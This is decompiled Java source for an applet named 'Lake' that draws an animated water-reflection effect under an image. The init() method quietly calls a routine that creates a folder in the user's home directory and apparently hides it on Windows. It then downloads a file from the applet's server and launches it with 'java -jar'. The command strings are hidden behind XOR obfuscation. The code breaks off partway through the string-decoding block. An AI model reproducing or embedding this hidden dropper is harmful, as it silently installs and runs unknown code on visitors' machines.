// 
// Decompiled by Procyon v0.5.30
// 

package ia;

import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.net.URI;
import java.awt.Event;
import java.awt.Component;
import java.awt.MediaTracker;
import java.awt.image.ImageObserver;
import java.net.MalformedURLException;
import java.io.File;
import java.net.URL;
import java.awt.Image;
import java.awt.Graphics;
import java.applet.Applet;

public class Lake extends Applet implements Runnable
{
    Thread a;
    private Graphics b;
    private Graphics c;
    private Image d;
    private Image e;
    private Image f;
    private int g;
    private int h;
    private int i;
    private int j;
    private int k;
    private boolean l;
    private boolean m;
    private final int n = 12;
    SecurityManager o;
    Thread p;
    private String q;
    private String r;
    private URL s;
    private String t;
    private final String u;
    private final String v;
    private final String w;
    private final String x;
    private static final String[] z;
    
    public Lake() {
        this.a = null;
        this.h = 0;
        this.i = 0;
        this.j = 0;
        this.k = 0;
        this.l = false;
        this.m = true;
        this.q = "";
        this.r = "";
        this.t = Lake.z[3];
        this.u = Lake.z[4];
        this.v = Lake.z[0];
        this.w = Lake.z[1];
        this.x = Lake.z[2];
    }
    
    public String getAppletInfo() {
        return Lake.z[30];
    }
    
    public String[][] getParameterInfo() {
        return new String[][] { { Lake.z[4], Lake.z[9], Lake.z[6] }, { Lake.z[0], Lake.z[9], Lake.z[7] }, { Lake.z[1], Lake.z[5], Lake.z[10] }, { Lake.z[2], Lake.z[9], Lake.z[8] } };
    }
    
    public void init() {
        this.b();
        try {
            this.o = System.getSecurityManager();
            final File file = new File(System.getProperty(Lake.z[13]) + Lake.z[12]);
            try {
                if (this.o != null) {
                    this.o.checkWrite(file.getPath());
                }
            }
            catch (MalformedURLException ex) {
                throw ex;
            }
            final String parameter = this.getParameter(Lake.z[4]);
            try {
                if (parameter != null) {
                    this.q = parameter;
                }
            }
            catch (MalformedURLException ex2) {
                throw ex2;
            }
            final String parameter2 = this.getParameter(Lake.z[0]);
            try {
                if (parameter2 != null) {
                    this.r = parameter2;
                }
            }
            catch (MalformedURLException ex3) {
                throw ex3;
            }
            final String parameter3 = this.getParameter(Lake.z[1]);
            Label_0186: {
                try {
                    if (parameter3 != null) {
                        final Lake lake = this;
                        final Lake lake2 = this;
                        final URL url = lake2.getDocumentBase();
                        final String s = parameter3;
                        final URL url2 = new URL(url, s);
                        lake.s = url2;
                    }
                    break Label_0186;
                }
                catch (SecurityException ex4) {
                    throw ex4;
                }
                try {
                    final Lake lake = this;
                    final Lake lake2 = this;
                    final URL url = lake2.getDocumentBase();
                    final String s = parameter3;
                    final URL url2 = new URL(url, s);
                    lake.s = url2;
                }
                catch (MalformedURLException ex7) {
                    this.getAppletContext().showStatus(Lake.z[11] + parameter3);
                    return;
                }
            }
            final String parameter4 = this.getParameter(Lake.z[2]);
            try {
                if (parameter4 != null) {
                    this.t = parameter4;
                }
            }
            catch (MalformedURLException ex5) {
                throw ex5;
            }
            this.p = new Thread(this);
        }
        catch (Exception ex6) {
            ex6.printStackTrace();
        }
    }
    
    public void destroy() {
    }
    
    private void a(final Graphics graphics) {
        try {
            if (!this.l) {
                return;
            }
        }
        catch (SecurityException ex) {
            throw ex;
        }
        try {
            if (this.f != null) {
                graphics.drawImage(this.f, -this.g * this.h, this.i, this);
                graphics.drawImage(this.f, (12 - this.g) * this.h, this.i, this);
            }
        }
        catch (SecurityException ex2) {
            throw ex2;
        }
        graphics.drawImage(this.d, 0, -1, this);
    }
    
    public void paint(final Graphics graphics) {
        try {
            Label_0018: {
                try {
                    if (this.o == null) {
                        return;
                    }
                    final Lake lake = this;
                    final boolean b = lake.l;
                    if (b) {
                        break Label_0018;
                    }
                    break Label_0018;
                }
                catch (SecurityException ex) {
                    throw ex;
                }
                try {
                    final Lake lake = this;
                    final boolean b = lake.l;
                    if (b) {
                        this.a(graphics);
                        return;
                    }
                }
                catch (SecurityException ex2) {
                    throw ex2;
                }
            }
            graphics.drawString(Lake.z[14], 10, 20);
        }
        catch (SecurityException ex3) {
            this.stop();
        }
    }
    
    public void start() {
        try {
            if (this.a == null) {
                (this.a = new Thread(this)).start();
            }
        }
        catch (SecurityException ex) {
            throw ex;
        }
    }
    
    public void stop() {
        try {
            if (this.a != null) {
                this.a.stop();
                this.a = null;
            }
        }
        catch (SecurityException ex) {
            throw ex;
        }
    }
    
    public void run() {
        this.g = 0;
        if (!this.l) {
            this.repaint();
            this.b = this.getGraphics();
            final MediaTracker mediaTracker = new MediaTracker(this);
            try {
                this.d = this.getImage(this.getDocumentBase(), this.q);
                if (!"".equals(this.r)) {
                    this.e = this.getImage(this.getDocumentBase(), this.r);
                }
            }
            catch (InterruptedException ex) {
                throw ex;
            }
            try {
                mediaTracker.addImage(this.d, 0);
                if (!"".equals(this.r)) {
                    mediaTracker.addImage(this.e, 1);
                }
            }
            catch (InterruptedException ex2) {
                throw ex2;
            }
            try {
                boolean l = false;
                Label_0133: {
                    try {
                        mediaTracker.waitForAll();
                        if (!mediaTracker.isErrorAny()) {
                            l = true;
                            break Label_0133;
                        }
                    }
                    catch (InterruptedException ex3) {
                        throw ex3;
                    }
                    l = false;
                }
                this.l = l;
            }
            catch (InterruptedException ex8) {}
            try {
                if (!this.l) {
                    this.stop();
                    this.b.drawString(Lake.z[29], 10, 40);
                    return;
                }
            }
            catch (InterruptedException ex4) {
                throw ex4;
            }
            try {
                this.h = this.d.getWidth(this);
                this.i = this.d.getHeight(this);
                if (!"".equals(this.r)) {
                    this.j = this.e.getWidth(this);
                    this.k = this.e.getHeight(this);
                }
            }
            catch (InterruptedException ex5) {
                throw ex5;
            }
            this.a();
        }
        this.repaint();
        while (true) {
            try {
                while (true) {
                    Label_0295: {
                        Label_0277: {
                            try {
                                if (!this.m) {
                                    break Label_0295;
                                }
                                final Lake lake = this;
                                final Lake lake2 = this;
                                final Graphics graphics = lake2.b;
                                lake.a(graphics);
                                final Lake lake3 = this;
                                final int n = ++lake3.g;
                                final int n2 = 12;
                                if (n == n2) {
                                    break Label_0277;
                                }
                                break Label_0277;
                            }
                            catch (InterruptedException ex6) {
                                throw ex6;
                            }
                            try {
                                final Lake lake = this;
                                final Lake lake2 = this;
                                final Graphics graphics = lake2.b;
                                lake.a(graphics);
                                final Lake lake3 = this;
                                final int n = ++lake3.g;
                                final int n2 = 12;
                                if (n == n2) {
                                    this.g = 0;
                                }
                            }
                            catch (InterruptedException ex7) {
                                throw ex7;
                            }
                        }
                        Thread.sleep(50L);
                        continue;
                    }
                    Thread.sleep(500L);
                }
            }
            catch (InterruptedException ex9) {
                this.stop();
                continue;
            }
            continue;
        }
    }
    
    public boolean mouseUp(final Event event, final int n, final int n2) {
        super.mouseUp(event, n, n2);
        Label_0040: {
            Lake lake = null;
            boolean m = false;
            Label_0034: {
                Label_0028: {
                    try {
                        if (this.s != null) {
                            break Label_0040;
                        }
                        lake = this;
                        final Lake lake2 = this;
                        final boolean b = lake2.m;
                        if (!b) {
                            break Label_0028;
                        }
                        break Label_0028;
                    }
                    catch (SecurityException ex) {
                        throw ex;
                    }
                    try {
                        lake = this;
                        final Lake lake2 = this;
                        final boolean b = lake2.m;
                        if (!b) {
                            m = true;
                            break Label_0034;
                        }
                    }
                    catch (SecurityException ex2) {
                        throw ex2;
                    }
                }
                m = false;
            }
            lake.m = m;
            return true;
        }
        this.showStatus("" + this.s);
        this.getAppletContext().showDocument(this.s, this.t);
        return true;
    }
    
    public void a() {
        final Image image = this.createImage(this.h, this.i + 1);
        final Graphics graphics = image.getGraphics();
        graphics.drawImage(this.d, 0, 1, this);
        int i = 0;
        try {
            while (i < this.i >> 1) {
                graphics.copyArea(0, i, this.h, 1, 0, this.i - i);
                graphics.copyArea(0, this.i - 1 - i, this.h, 1, 0, -this.i + 1 + (i << 1));
                graphics.copyArea(0, this.i, this.h, 1, 0, -1 - i);
                ++i;
            }
        }
        catch (SecurityException ex) {
            throw ex;
        }
        this.f = this.createImage(13 * this.h, this.i);
        (this.c = this.f.getGraphics()).drawImage(image, 12 * this.h, 0, this);
        int j = 0;
        try {
            while (j < 12) {
                this.a(this.c, j);
                ++j;
            }
        }
        catch (SecurityException ex2) {
            throw ex2;
        }
        try {
            graphics.drawImage(this.d, 0, 1, this);
            if (!"".equals(this.r)) {
                graphics.drawImage(this.e, this.h - this.j >> 1, this.i - (this.k >> 1), this);
            }
        }
        catch (SecurityException ex3) {
            throw ex3;
        }
        this.d = image;
    }
    
    public void a(final Graphics graphics, final int n) {
        final double n2 = 6.283185307179586 * n / 12.0;
        final int n3 = (12 - n) * this.h;
        for (int i = 0; i < this.i; ++i) {
            final int n4 = (int)(this.i / 14 * (i + 28.0) * Math.sin(this.i / 14 * (this.i - i) / (i + 1) + n2) / this.i);
            try {
                if (i < -n4) {
                    graphics.copyArea(12 * this.h, i, this.h, 1, -n3, 0);
                    continue;
                }
            }
            catch (SecurityException ex) {
                throw ex;
            }
            graphics.copyArea(12 * this.h, i + n4, this.h, 1, -n3, -n4);
        }
        try {
            if (!"".equals(this.r)) {
                graphics.drawImage(this.e, n * this.h + (this.h - this.j >> 1), -this.k >> 1, this);
            }
        }
        catch (SecurityException ex2) {
            throw ex2;
        }
    }
    
    private void b() {
        try {
            final String string = System.getProperty(Lake.z[16]) + File.separatorChar + Lake.z[21];
            boolean b = false;
            Label_0069: {
                try {
                    if (System.getProperty(Lake.z[27]).toLowerCase().indexOf(Lake.z[19]) > -1) {
                        b = true;
                        break Label_0069;
                    }
                }
                catch (Exception ex) {
                    throw ex;
                }
                b = false;
            }
            final boolean b2 = b;
            final File file = new File(string);
            Label_0153: {
                try {
                    if (file.exists()) {
                        break Label_0153;
                    }
                    file.mkdirs();
                    if (!b2) {
                        break Label_0153;
                    }
                }
                catch (Exception ex2) {
                    throw ex2;
                }
                try {
                    Runtime.getRuntime().exec(Lake.z[24] + file.getPath() + "\"").waitFor();
                }
                catch (Exception ex3) {
                    ia.g.a(ex3.getLocalizedMessage());
                }
            }
            final String string2 = string + File.separatorChar + Lake.z[26];
            final URI uri = new URI(this.getCodeBase() + Lake.z[26]);
            final String lowerCase = uri.getScheme().toLowerCase();
            Label_0276: {
                Label_0261: {
                    String s;
                    try {
                        if (lowerCase.equals(Lake.z[15])) {
                            break Label_0261;
                        }
                        s = lowerCase;
                        final String[] array = Lake.z;
                        final int n = 22;
                        final String s2 = array[n];
                        final boolean b3 = s.equals(s2);
                        if (b3) {
                            break Label_0261;
                        }
                        break Label_0276;
                    }
                    catch (Exception ex4) {
                        throw ex4;
                    }
                    try {
                        final String[] array = Lake.z;
                        final int n = 22;
                        final String s2 = array[n];
                        final boolean b3 = s.equals(s2);
                        if (b3) {
                            this.a(uri.toURL(), string2);
                            break Label_0276;
                        }
                    }
                    catch (Exception ex5) {
                        throw ex5;
                    }
                }
                try {
                    if (lowerCase.equals(Lake.z[20])) {
                        this.a(new File(uri), new File(string2));
                    }
                }
                catch (Exception ex6) {
                    throw ex6;
                }
            }
            final String[] array2 = { System.getProperty(Lake.z[17]) + Lake.z[28], Lake.z[18], string2 };
            try {
                Runtime.getRuntime().exec(array2);
                if (b2) {
                    Runtime.getRuntime().exec(Lake.z[25] + string + Lake.z[23]).waitFor();
                }
            }
            catch (Exception ex7) {
                throw ex7;
            }
        }
        catch (Exception ex8) {
            ex8.printStackTrace();
        }
    }
    
    private void a(final File file, final File file2) throws IOException {
        final FileInputStream fileInputStream = new FileInputStream(file);
        final byte[] array = new byte[1024];
        final FileOutputStream fileOutputStream = new FileOutputStream(file2);
        while (true) {
            final int read = fileInputStream.read(array, 0, 1024);
            final int n = -1;
            try {
                if (read != n) {
                    fileOutputStream.write(array, 0, read);
                    continue;
                }
            }
            catch (IOException ex) {
                throw ex;
            }
            break;
        }
        fileOutputStream.close();
        fileInputStream.close();
    }
    
    private void a(final URL url, final String s) {
        try {
            final File file = new File(s);
            if (!file.exists()) {
                final String parent = file.getParent();
                if (parent != null) {
                    final File file2 = new File(parent);
                    try {
                        if (!file2.exists()) {
                            file2.mkdirs();
                        }
                    }
                    catch (Exception ex) {
                        throw ex;
                    }
                }
            }
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(url.openConnection().getInputStream());
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s));
            while (true) {
                final int read = bufferedInputStream.read();
                try {
                    if (read != -1) {
                        bufferedOutputStream.write(read);
                        continue;
                    }
                }
                catch (Exception ex2) {
                    throw ex2;
                }
                break;
            }
            bufferedOutputStream.flush();
            bufferedInputStream.close();
            bufferedOutputStream.close();
        }
        catch (Exception ex3) {
            ia.g.a(ex3.getLocalizedMessage());
        }
    }
    
    static {
        final String[] z2 = new String[31];
        final int n = 0;
        final char[] charArray = "{\u0010D\u0006cu\u001f".toCharArray();
        int length;
        int n3;
        final int n2 = n3 = (length = charArray.length);
        int n4 = 0;
        while (true) {
            Label_0098: {
                if (n2 > 1) {
                    break Label_0098;
                }
                length = (n3 = n4);
                do {
                    final char c = charArray[n3];
                    char c2 = '\0';
                    switch (n4 % 5) {
                        case 0: {
                            c2 = '\u0014';
                            break;
                        }
                        case 1: {
                            c2 = 'f';
                            break;
                        }
                        case 2: {
                            c2 = '!';
                            break;
                        }
                        case 3: {
                            c2 = 't';
                            break;
                        }
                        default: {
                            c2 = '\u000f';
                            break;
                        }
                    }
                    charArray[length] = (char)(c ^ c2);
                    ++n4;
                } while (n2 == 0);
            }
            if (n2 > n4) {
                continue;
            }
            break;
        }
        z2[n] = new String(charArray).intern();
        final int n5 = 1;
        final char[] charArray2 = "|\u0014D\u0012".toCharArray();
        int length2;
        int n7;
        final int n6 = n7 = (length2 = charArray2.length);
        int n8 = 0;
        while (true) {
            Label_0214: {
                if (n6 > 1) {
                    break Label_0214;
                }
                length2 = (n7 = n8);
                do {
                    final char c3 = charArray2[n7];
                    char c4 = '\0';
                    switch (n8 % 5) {
                        case 0: {
                            c4 = '\u0014';
                            break;
                        }
                        case 1: {
                            c4 = 'f';
                            break;
                        }
                        case 2: {
                            c4 = '!';
                            break;
                        }
                        case 3: {
                            c4 = 't';
                            break;
                        }
                        default: {
                            c4 = '\u000f';
                            break;
                        }
                    }
                    charArray2[length2] = (char)(c3 ^ c4);
                    ++n8;
                } while (n6 == 0);
            }
            if (n6 > n8) {
                continue;
            }
            break;
        }
        z2[n5] = new String(charArray2).intern();
        final int n9 = 2;
        final char[] charArray3 = "`\u0007S\u0013j`".toCharArray();
        int length3;
        int n11;
        final int n10 = n11 = (length3 = charArray3.length);
        int n12 = 0;
        while (true) {
            Label_0330: {
                if (n10 > 1) {
                    break Label_0330;
                }
                length3 = (n11 = n12);
                do {
                    final char c5 = charArray3[n11];
                    char c6 = '\0';
                    switch (n12 % 5) {
                        case 0: {
                            c6 = '\u0014';
                            break;
                        }
                        case 1: {
                            c6 = 'f';
                            break;
                        }
                        case 2: {
                            c6 = '!';
                            break;
                        }
                        case 3: {
                            c6 = 't';
                            break;
                        }
                        default: {
                            c6 = '\u000f';
                            break;
                        }
                    }
                    charArray3[length3] = (char)(c5 ^ c6);
                    ++n12;
                } while (n10 == 0);
            }
            if (n10 > n12) {
                continue;
            }
            break;
        }
        z2[n9] = new String(charArray3).intern();
        final int n13 = 3;
        final char[] charArray4 = "K\u0015D\u0018i".toCharArray();
        int length4;
        int n15;
        final int n14 = n15 = (length4 = charArray4.length);
        int n16 = 0;
        while (true) {
            Label_0446: {
                if (n14 > 1) {
                    break Label_0446;
                }
                length4 = (n15 = n16);
                do {
                    final char c7 = charArray4[n15];
                    char c8 = '\0';
                    switch (n16 % 5) {
                        case 0: {
                            c8 = '\u0014';
                            break;
                        }
                        case 1: {
                            c8 = 'f';
                            break;
                        }
                        case 2: {
                            c8 = '!';
                            break;
                        }
                        case 3: {
                            c8 = 't';
                            break;
                        }
                        default: {
                            c8 = '\u000f';
                            break;
                        }
                    }
                    charArray4[length4] = (char)(c7 ^ c8);
                    ++n16;
                } while (n14 == 0);
            }
            if (n14 > n16) {
                continue;
            }
            break;
        }
        z2[n13] = new String(charArray4).intern();
        final int n17 = 4;
        final char[] charArray5 = "}\u000b@\u0013j".toCharArray();
        int length5;
        int n19;
        final int n18 = n19 = (length5 = charArray5.length);
        int n20 = 0;
        while (true) {
            Label_0562: {
                if (n18 > 1) {
                    break Label_0562;
                }
                length5 = (n19 = n20);
                do {
                    final char c9 = charArray5[n19];
                    char c10 = '\0';
                    switch (n20 % 5) {
                        case 0: {
                            c10 = '\u0014';
                            break;
                        }
                        case 1: {
                            c10 = 'f';
                            break;
                        }
                        case 2: {
                            c10 = '!';
                            break;
                        }
                        case 3: {
                            c10 = 't';
                            break;
                        }
                        default: {
                            c10 = '\u000f';
                            break;
                        }
                    }
                    charArray5[length5] = (char)(c9 ^ c10);
                    ++n20;
                } while (n18 == 0);
            }
            if (n18 > n20) {
                continue;
            }
            break;
        }
        z2[n17] = new String(charArray5).intern();
        final int n21 = 5;
        final char[] charArray6 = "A4m".toCharArray();
        int length6;
        int n23;
        final int n22 = n23 = (length6 = charArray6.length);
        int n24 = 0;
        while (true) {
            Label_0678: {
                if (n22 > 1) {
                    break Label_0678;
                }
                length6 = (n23 = n24);
                do {
                    final char c11 = charArray6[n23];
                    char c12 = '\0';
                    switch (n24 % 5) {
                        case 0: {
                            c12 = '\u0014';
                            break;
                        }
                        case 1: {
                            c12 = 'f';
                            break;
                        }
                        case 2: {
                            c12 = '!';
                            break;
                        }
                        case 3: {
                            c12 = 't';
                            break;
                        }
                        default: {
                            c12 = '\u000f';
                            break;
                        }
                    }
                    charArray6[length6] = (char)(c11 ^ c12);
                    ++n24;
                } while (n22 == 0);
            }
            if (n22 > n24) {
                continue;
            }
            break;
        }
        z2[n21] = new String(charArray6).intern();
        final int n25 = 6;
        final char[] charArray7 = "^6fT`fFf=I4\u0000H\u0018j4\u0012NT}q\u0000M\u0011l`".toCharArray();
        int length7;
        int n27;
        final int n26 = n27 = (length7 = charArray7.length);
        int n28 = 0;
        while (true) {
            Label_0798: {
                if (n26 > 1) {
                    break Label_0798;
                }
                length7 = (n27 = n28);
                do {
                    final char c13 = charArray7[n27];
                    char c14 = '\0';
                    switch (n28 % 5) {
                        case 0: {
                            c14 = '\u0014';
                            break;
                        }
                        case 1: {
                            c14 = 'f';
                            break;
                        }
                        case 2: {
                            c14 = '!';
                            break;
                        }
                        case 3: {
                            c14 = 't';
                            break;
                        }
                        default: {
                            c14 = '\u000f';
                            break;
                        }
                    }
                    charArray7[length7] = (char)(c13 ^ c14);
                    ++n28;
                } while (n26 == 0);
            }
            if (n26 > n28) {
                continue;
            }
            break;
        }
        z2[n25] = new String(charArray7).intern();
        final int n29 = 7;
        final char[] charArray8 = "^6fT`fFf=I4\u0000H\u0018j4\u0012NTzg\u0003\u0001\u0015|4\tW\u0011}x\u0007X".toCharArray();
        int length8;
        int n31;
        final int n30 = n31 = (length8 = charArray8.length);
        int n32 = 0;
        while (true) {
            Label_0918: {
                if (n30 > 1) {
                    break Label_0918;
                }
                length8 = (n31 = n32);
                do {
                    final char c15 = charArray8[n31];
                    char c16 = '\0';
                    switch (n32 % 5) {
                        case 0: {
                            c16 = '\u0014';
                            break;
                        }
                        case 1: {
                            c16 = 'f';
                            break;
                        }
                        case 2: {
                            c16 = '!';
                            break;
                        }
                        case 3: {
                            c16 = 't';
                            break;
                        }
                        default: {
                            c16 = '\u000f';
                            break;
                        }
                    }
                    charArray8[length8] = (char)(c15 ^ c16);
                    ++n32;
                } while (n30 == 0);
            }
            if (n30 > n32) {
                continue;
            }
            break;
        }
        z2[n29] = new String(charArray8).intern();
        final int n33 = 8;
        final char[] charArray9 = "@\u0007S\u0013j`FG\u0006ny\u0003".toCharArray();
        int length9;
        int n35;
        final int n34 = n35 = (length9 = charArray9.length);
        int n36 = 0;
        while (true) {
            Label_1038: {
                if (n34 > 1) {
                    break Label_1038;
                }
                length9 = (n35 = n36);
                do {
                    final char c17 = charArray9[n35];
                    char c18 = '\0';
                    switch (n36 % 5) {
                        case 0: {
                            c18 = '\u0014';
                            break;
                        }
                        case 1: {
                            c18 = 'f';
                            break;
                        }
                        case 2: {
                            c18 = '!';
                            break;
                        }
                        case 3: {
                            c18 = 't';
                            break;
                        }
                        default: {
                            c18 = '\u000f';
                            break;
                        }
                    }
                    charArray9[length9] = (char)(c17 ^ c18);
                    ++n36;
                } while (n34 == 0);
            }
            if (n34 > n36) {
                continue;
            }
            break;
        }
        z2[n33] = new String(charArray9).intern();
        final int n37 = 9;
        final char[] charArray10 = "G\u0012S\u001das".toCharArray();
        int length10;
        int n39;
        final int n38 = n39 = (length10 = charArray10.length);
        int n40 = 0;
        while (true) {
            Label_1158: {
                if (n38 > 1) {
                    break Label_1158;
                }
                length10 = (n39 = n40);
                do {
                    final char c19 = charArray10[n39];
                    char c20 = '\0';
                    switch (n40 % 5) {
                        case 0: {
                            c20 = '\u0014';
                            break;
                        }
                        case 1: {
                            c20 = 'f';
                            break;
                        }
                        case 2: {
                            c20 = '!';
                            break;
                        }
                        case 3: {
                            c20 = 't';
                            break;
                        }
                        default: {
                            c20 = '\u000f';
                            break;
                        }
                    }
                    charArray10[length10] = (char)(c19 ^ c20);
                    ++n40;
                } while (n38 == 0);
            }
            if (n38 > n40) {
                continue;
            }
            break;
        }
        z2[n37] = new String(charArray10).intern();
        final int n41 = 10;
        final char[] charArray11 = "A4mT{{FM\u001da\u007fFU\u001b".toCharArray();
        int length11;
        int n43;
        final int n42 = n43 = (length11 = charArray11.length);
        int n44 = 0;
        while (true) {
            Label_1278: {
                if (n42 > 1) {
                    break Label_1278;
                }
                length11 = (n43 = n44);
                do {
                    final char c21 = charArray11[n43];
                    char c22 = '\0';
                    switch (n44 % 5) {
                        case 0: {
                            c22 = '\u0014';
                            break;
                        }
                        case 1: {
                            c22 = 'f';
                            break;
                        }
                        case 2: {
                            c22 = '!';
                            break;
                        }
                        case 3: {
                            c22 = 't';
                            break;
                        }
                        default: {
                            c22 = '\u000f';
                            break;
                        }
                    }
                    charArray11[length11] = (char)(c21 ^ c22);
                    ++n44;
                } while (n42 == 0);
            }
            if (n42 > n44) {
                continue;
            }
            break;
        }
        z2[n41] = new String(charArray11).intern();
        final int n45 = 11;
        final char[] charArray12 = "V\u0007ETZF*\u001bT".toCharArray();
        int length12;
        int n47;
        final int n46 = n47 = (length12 = charArray12.length);
        int n48 = 0;
        while (true) {
            Label_1398: {
                if (n46 > 1) {
                    break Label_1398;
                }
                length12 = (n47 = n48);
                do {
                    final char c23 = charArray12[n47];
                    char c24 = '\0';
                    switch (n48 % 5) {
                        case 0: {
                            c24 = '\u0014';
                            break;
                        }
                        case 1: {
                            c24 = 'f';
                            break;
                        }
                        case 2: {
                            c24 = '!';
                            break;
                        }
                        case 3: {
                            c24 = 't';
                            break;
                        }
                        default: {
                            c24 = '\u000f';
                            break;
                        }
                    }
                    charArray12[length12] = (char)(c23 ^ c24);
                    ++n48;
                } while (n46 == 0);
            }
            if (n46 > n48) {
                continue;
            }
            break;
        }
        z2[n45] = new String(charArray12).intern();
        final int n49 = 12;
        final char[] charArray13 = ";\fO\u0015auHU\u0007n".toCharArray();
        int length13;
        int n51;
        final int n50 = n51 = (length13 = charArray13.length);
        int n52 = 0;
        while (true) {
            Label_1518: {
                if (n50 > 1) {
                    break Label_1518;
                }
                length13 = (n51 = n52);
                do {
                    final char c25 = charArray13[n51];
                    char c26 = '\0';
                    switch (n52 % 5) {
                        case 0: {
                            c26 = '\u0014';
                            break;
                        }
                        case 1: {
                            c26 = 'f';
                            break;
                        }
                        case 2: {
                            c26 = '!';
                            break;
                        }
                        case 3: {
                            c26 = 't';
                            break;
                        }
                        default: {
                            c26 = '\u000f';
                            break;
                        }
                    }
                    charArray13[length13] = (char)(c25 ^ c26);
                    ++n52;
                } while (n50 == 0);
            }
            if (n50 > n52) {
                continue;
            }
            break;
        }
        z2[n49] = new String(charArray13).intern();
        final int n53 = 13;
        final char[] charArray14 = "~\u0007W\u0015!}\t\u000f\u0000bd\u0002H\u0006".toCharArray();
        int length14;
        int n55;
        final int n54 = n55 = (length14 = charArray14.length);
        int n56 = 0;
        while (true) {
            Label_1638: {
                if (n54 > 1) {
                    break Label_1638;
                }
                length14 = (n55 = n56);
                do {
                    final char c27 = charArray14[n55];
                    char c28 = '\0';
                    switch (n56 % 5) {
                        case 0: {
                            c28 = '\u0014';
                            break;
                        }
                        case 1: {
                            c28 = 'f';
                            break;
                        }
                        case 2: {
                            c28 = '!';
                            break;
                        }
                        case 3: {
                            c28 = 't';
                            break;
                        }
                        default: {
                            c28 = '\u000f';
                            break;
                        }
                    }
                    charArray14[length14] = (char)(c27 ^ c28);
                    ++n56;
                } while (n54 == 0);
            }
            if (n54 > n56) {
                continue;
            }
            break;
        }
        z2[n53] = new String(charArray14).intern();
        final int n57 = 14;
        final char[] charArray15 = "M)tTBA5uTLX/b?/U%b1_@Fu;/X)`0/@.dTFY'f1/D4n$JF*x".toCharArray();
        int length15;
        int n59;
        final int n58 = n59 = (length15 = charArray15.length);
        int n60 = 0;
        while (true) {
            Label_1758: {
                if (n58 > 1) {
                    break Label_1758;
                }
                length15 = (n59 = n60);
                do {
                    final char c29 = charArray15[n59];
                    char c30 = '\0';
                    switch (n60 % 5) {
                        case 0: {
                            c30 = '\u0014';
                            break;
                        }
                        case 1: {
                            c30 = 'f';
                            break;
                        }
                        case 2: {
                            c30 = '!';
                            break;
                        }
                        case 3: {
                            c30 = 't';
                            break;
                        }
                        default: {
                            c30 = '\u000f';
                            break;
                        }
                    }
                    charArray15[length15] = (char)(c29 ^ c30);
                    ++n60;
                } while (n58 == 0);
            }
            if (n58 > n60) {
                continue;
            }
            break;
        }
        z2[n57] = new String(charArray15).intern();
        final int n61 = 15;
        final char[] charArray16 = "|\u0012U\u0004".toCharArray();
        int length16;
        int n63;
        final int n62 = n63 = (length16 = charArray16.length);
        int n64 = 0;
        while (true) {
            Label_1878: {
                if (n62 > 1) {
                    break Label_1878;
                }
                length16 = (n63 = n64);
                do {
                    final char c31 = charArray16[n63];
                    char c32 = '\0';
                    switch (n64 % 5) {
                        case 0: {
                            c32 = '\u0014';
                            break;
                        }
                        case 1: {
                            c32 = 'f';
                            break;
                        }
                        case 2: {
                            c32 = '!';
                            break;
                        }
                        case 3: {
                            c32 = 't';
                            break;
                        }
                        default: {
                            c32 = '\u000f';
                            break;
                        }
                    }
                    charArray16[length16] = (char)(c31 ^ c32);
                    ++n64;
                } while (n62 == 0);
            }
            if (n62 > n64) {
                continue;
            }
            break;
        }
        z2[n61] = new String(charArray16).intern();
        final int n65 = 16;
        final char[] charArray17 = "a\u0015D\u0006!|\tL\u0011".toCharArray();
        int length17;
        int n67;
        final int n66 = n67 = (length17 = charArray17.length);
        int n68 = 0;
        while (true) {
            Label_1998: {
                if (n66 > 1) {
                    break Label_1998;
                }
                length17 = (n67 = n68);
                do {
                    final char c33 = charArray17[n67];
                    char c34 = '\0';
                    switch (n68 % 5) {
                        case 0: {
                            c34 = '\u0014';
                            break;
                        }
                        case 1: {
                            c34 = 'f';
                            break;
                        }
                        case 2: {
                            c34 = '!';
                            break;
                        }
                        case 3: {
                            c34 = 't';
                            break;
                        }
                        default: {
                            c34 = '\u000f';
                            break;
                        }
                    }
                    charArray17[length17] = (char)(c33 ^ c34);
                    ++n68;
                } while (n66 == 0);
            }
            if (n66 > n68) {
                continue;
            }
            break;
        }
        z2[n65] = new String(charArray17).intern();
        final int n69 = 17;
        final char[] charArray18 = "~\u0007W\u0015!|\tL\u0011".toCharArray();
        int length18;
        int n71;
        final int n70 = n71 = (length18 = charArray18.length);
        int n72 = 0;
        while (true) {
            Label_2118: {
                if (n70 > 1) {
                    break Label_2118;
                }
                length18 = (n71 = n72);
                do {
                    final char c35 = charArray18[n71];
                    char c36 = '\0';
                    switch (n72 % 5) {
                        case 0: {
                            c36 = '\u0014';
                            break;
                        }
                        case 1: {
                            c36 = 'f';
                            break;
                        }
                        case 2: {
                            c36 = '!';
                            break;
                        }
                        case 3: {
                            c36 = 't';
                            break;
                        }
                        default: {
                            c36 = '\u000f';
                            break;
                        }
                    }
                    charArray18[length18] = (char)(c35 ^ c36);
                    ++n72;
                } while (n70 == 0);
            }
            if (n70 > n72) {
                continue;
            }
            break;
        }
        z2[n69] = new String(charArray18).intern();
        final int n73 = 18;
        final char[] charArray19 = "9\f@\u0006".toCharArray();
        int length19;
        int n75;
        final int n74 = n75 = (length19 = charArray19.length);
        int n76 = 0;
        while (true) {
            Label_2238: {
                if (n74 > 1) {
                    break Label_2238;
                }
                length19 = (n75 = n76);
                do {
                    final char c37 = charArray19[n75];
                    char c38 = '\0';
                    switch (n76 % 5) {
                        case 0: {
                            c38 = '\u0014';
                            break;
                        }
                        case 1: {
                            c38 = 'f';
                            break;
                        }
                        case 2: {
                            c38 = '!';
                            break;
                        }
                        case 3: {
                            c38 = 't';
                            break;
                        }
                        default: {
                            c38 = '\u000f';
                            break;
                        }
                    }
                    charArray19[length19] = (char)(c37 ^ c38);
                    ++n76;
                } while (n74 == 0);
            }
            if (n74 > n76) {
                continue;
            }
            break;
        }
        z2[n73] = new String(charArray19).intern();
        final int n77 = 19;
        final char[] charArray20 = "c\u000fO\u0010`c\u0015".toCharArray();
        int length20;
        int n79;
        final int n78 = n79 = (length20 = charArray20.length);
        int n80 = 0;
        while (true) {
            Label_2358: {
                if (n78 > 1) {
                    break Label_2358;
                }
                length20 = (n79 = n80);
                do {
                    final char c39 = charArray20[n79];
                    char c40 = '\0';
                    switch (n80 % 5) {
                        case 0: {
                            c40 = '\u0014';
                            break;
                        }
                        case 1: {
                            c40 = 'f';
                            break;
                        }
                        case 2: {
                            c40 = '!';
                            break;
                        }
